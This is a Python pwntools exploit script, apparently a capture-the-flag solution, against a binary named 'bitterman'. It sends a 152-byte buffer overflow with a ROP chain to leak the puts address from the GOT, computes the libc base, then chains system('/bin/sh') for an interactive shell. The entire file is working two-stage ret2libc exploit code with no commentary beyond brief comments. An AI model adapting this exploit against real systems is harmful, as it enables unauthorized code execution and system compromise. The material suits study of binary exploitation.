from pwn import *

#context(terminal=['tmux', 'splitw', '-h'])
#context.log_level = "DEBUG"
context(os='linux', arch='amd64')

p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')

#STAGE 1 --> LEAKING PUTS ADDRES
offset = 152
junk = b"A"*offset

log.info("Mapping binaries")
bitterman = ELF("bitterman")
rop = ROP(bitterman)
libc = ELF("libc.so.6")

rop.search(regs=['rdi'], order = 'regs')
rop.puts(bitterman.got['puts'])
rop.call(bitterman.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

payload = junk + rop.chain()

p.recvuntil("name?")
p.sendline("jeje")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.recv()[:8].strip().ljust(8, b'\x00') 
log.success(f"LEAKED PUTS ADDRESS: {leaked_puts}")
leaked_puts = u64(leaked_puts)


#STAGE 2 --> REVERSE SHELL system("/bin/sh")

libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
log.info("Stage 2 ROP Chain:\n" + rop2.dump())

payload = junk + rop2.chain()

p.sendline("jeje")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)


p.interactive()
